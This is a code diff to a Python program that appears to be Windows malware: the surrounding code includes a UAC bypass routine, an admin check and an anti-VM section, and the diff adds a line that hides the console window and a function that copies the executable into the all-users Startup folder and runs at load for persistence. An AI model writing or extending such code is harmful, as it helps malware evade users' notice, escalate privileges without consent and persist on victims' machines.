@@ -5,6 +5,8 @@ import sys
 import base64
 import ctypes
 
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
         execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
@@ -39,6 +41,22 @@ if not IsAdmin():
     if UACbypass():
         os._exit(0)
 
+def add_to_startup():
+    startup_folder = os.path.join(os.getenv('ProgramData'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    executable_path = GetSelf()
+    dest = os.path.join(startup_folder, os.path.basename(executable_path))
+    
+    if os.path.exists(dest):
+        print("Executable is already in Startup.")
+        return
+
+    try:
+        shutil.copy2(executable_path, dest)
+        print(f"Copied to Startup: {dest}")
+    except Exception as e:
+        print(f"Failed to copy to Startup: {e}")
+
+add_to_startup()
 # anti vm 
 import subprocess
 import getmac
